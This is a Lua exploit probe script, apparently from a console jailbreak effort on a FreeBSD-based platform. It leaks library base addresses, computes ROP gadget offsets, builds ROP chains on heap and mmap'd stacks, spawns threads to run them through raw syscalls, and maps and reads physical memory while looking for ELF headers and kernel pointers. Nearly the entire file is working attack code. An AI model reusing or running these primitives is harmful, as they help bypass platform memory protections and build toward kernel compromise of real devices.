-- CRASH_CLASS: LOW
-- PROBE 562i: Diagnose what kills child thread during phys read
--
-- 562h: section [A] (getpid via fn_addr, heap stack) = clean
--        section [C] (mov rax,[mapped_va], heap stack) = process dies
-- 562g: mov rax,[mapped_va] with mmap stack = reads work (DEADFACE) but "77" binary
--
-- Tests:
-- [A] Child reads HEAP memory (heap stack) — isolate MapDM access
-- [B] Child reads MapDM'd memory (MMAP stack) — test with thr_exit via fn_addr
-- [C] If B works, print results (should be clean text)

print("=== PROBE 562i: DIAGNOSE CHILD CRASH ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function fmt(val)
    if val == nil then return "nil" end
    if type(val) == "table" and val.h then
        return string.format("0x%08X%08X", val.h, val.l)
    end
    return string.format("0x%X", N(val))
end

local Z = uint64(0)
local sc477 = mk(477)

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
print("fn_addr=" .. fmt(stub))

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(Z, ib) end)
local elo = rd(N(ib) + 0x108) or 0; local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eb=" .. fmt(eb))

wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local llo = rd(N(ib) + 0x108) or 0; local lhi = rd(N(ib) + 0x10C) or 0
if llo < 0 then llo = llo + 0x100000000 end
if lhi < 0 then lhi = lhi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lhi, llo))
local mapdm_fn = lk + uint64(0x15020)

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67   -- mov [rdi],rax; ret
local g_mov_rax_m = eb + 0x1A5CC4  -- mov rax,[rsi]; ret

local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

io.flush()

-- ============================================================
-- [A] Child reads from HEAP memory (heap stack, fn_addr + thr_exit)
-- ============================================================
print("")
print("[A] child reads HEAP (heap stack)")

local test_data = memory.alloc(0x40)
for i = 0, 7 do wq(N(test_data) + i*8, uint64(0xCAFE0000 + i)) end

local shared_a = memory.alloc(0x80)
for i = 0, 0x7C, 4 do wd(N(shared_a) + i, 0) end

local stk_a = memory.alloc(0x4000)
local sb_a = N(stk_a)
local ss_a = 0x2000
local rsp_a = sb_a + ss_a - ((sb_a + ss_a) % 16) - 8

local off = 0
local function ea(v) wq(rsp_a + off, v); off = off + 8 end

-- Read 4 qwords from heap → shared+8
for qi = 0, 3 do
    ea(g_pop_rsi); ea(uint64(N(test_data) + qi * 8))
    ea(g_mov_rax_m)
    ea(g_pop_rdi); ea(uint64(N(shared_a) + 8 + qi * 8))
    ea(g_mov_m_rax)
end
ea(g_pop_rax); ea(uint64(0xDEADFACE))
ea(g_pop_rdi); ea(uint64(N(shared_a)))
ea(g_mov_m_rax)
ea(g_pop_rdi); ea(Z)
ea(g_pop_rax); ea(uint64(431))
ea(stub)

print(string.format("chain: %d entries", off/8))

local pa_a = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(pa_a) + i, 0) end
wq(N(pa_a), g_bare_ret)
wq(N(pa_a) + 0x10, uint64(sb_a))
wq(N(pa_a) + 0x18, uint64(ss_a))
local tid_a = memory.alloc(8); wq(N(tid_a), Z)
wq(N(pa_a) + 0x30, tid_a)

print("spawning...")
io.flush()
local ok_ta, rv_ta = pcall(function() return mk(455)(pa_a, uint64(0x38)) end)
print("thr_new ret=" .. (ok_ta and N(rv_ta) or -999))

for w = 1, 15000 do local _ = rd(sb_a) end

local sv_a = rb(N(shared_a)) or 0
print(string.format("sentinel=0x%X alive=%s", sv_a, tostring(alive())))
if sv_a == 0xDEADFACE then
    for qi = 0, 3 do
        local lo = rb(N(shared_a) + 8 + qi * 8) or 0
        print(string.format("  [%d] 0x%X (expect 0x%X)", qi, lo, 0xCAFE0000 + qi))
    end
end
io.flush()

-- ============================================================
-- [B] Child reads from MapDM'd phys (MMAP stack, fn_addr + thr_exit)
-- ============================================================
if not alive() then print("DEAD after [A]"); return end

print("")
print("[B] child reads MapDM'd phys (mmap stack)")

-- MapDM
local mapped_va = uint64("0x880000000")
pcall(function()
    sc477(mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z,
        uint64("0x100000000"), uint64(0x4000))
end)
print("MapDM rv=" .. (ok_md and N(rv_md) or -999))

-- MMAP stack (not heap)
local ss_b = 0x4000
local ok_sb, sb_b_raw = pcall(function()
    return sc477(Z, uint64(ss_b), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local sb_b = N(sb_b_raw)
local rsp_b = sb_b + ss_b - ((sb_b + ss_b) % 16) - 8

local shared_b = memory.alloc(0x80)
for i = 0, 0x7C, 4 do wd(N(shared_b) + i, 0) end

off = 0
local function eb_emit(v) wq(rsp_b + off, v); off = off + 8 end

-- Read 4 qwords from mapped_va
for qi = 0, 3 do
    eb_emit(g_pop_rsi); eb_emit(mapped_va + uint64(qi * 8))
    eb_emit(g_mov_rax_m)
    eb_emit(g_pop_rdi); eb_emit(uint64(N(shared_b) + 8 + qi * 8))
    eb_emit(g_mov_m_rax)
end
eb_emit(g_pop_rax); eb_emit(uint64(0xDEADFACE))
eb_emit(g_pop_rdi); eb_emit(uint64(N(shared_b)))
eb_emit(g_mov_m_rax)
eb_emit(g_pop_rdi); eb_emit(Z)
eb_emit(g_pop_rax); eb_emit(uint64(431))
eb_emit(stub)

print(string.format("chain: %d entries", off/8))

local pa_b = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(pa_b) + i, 0) end
wq(N(pa_b), g_bare_ret)
wq(N(pa_b) + 0x10, uint64(sb_b))
wq(N(pa_b) + 0x18, uint64(ss_b))
local tid_b = memory.alloc(8); wq(N(tid_b), Z)
wq(N(pa_b) + 0x30, tid_b)

print("spawning read child...")
io.flush()
local ok_tb, rv_tb = pcall(function() return mk(455)(pa_b, uint64(0x38)) end)
print("thr_new ret=" .. (ok_tb and N(rv_tb) or -999))

for w = 1, 20000 do local _ = rd(sb_b) end

local sv_b = rb(N(shared_b)) or 0
print(string.format("sentinel=0x%X alive=%s", sv_b, tostring(alive())))

if sv_b == 0xDEADFACE then
    print("PHYSICAL MEMORY READ!")
    for qi = 0, 3 do
        local lo = rb(N(shared_b) + 8 + qi * 8) or 0
        local hi = rb(N(shared_b) + 8 + qi * 8 + 4) or 0
        local tag = ""
        if qi == 0 and lo == 0x464C457F then tag = " *** ELF! ***" end
        if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then tag = tag .. " KPTR?" end
        print(string.format("  [+%02X] 0x%08X_%08X%s", qi*8, hi, lo, tag))
    end
else
    print("TIMEOUT — child crashed on MapDM read or thr_exit failed")
end

pcall(function() mk(73)(mapped_va, uint64(0x4000)) end)
pcall(function() mk(73)(sb_b_raw, uint64(ss_b)) end)

io.flush()
print("")
print("final alive=" .. tostring(alive()))
print("=== 562i DONE ===")
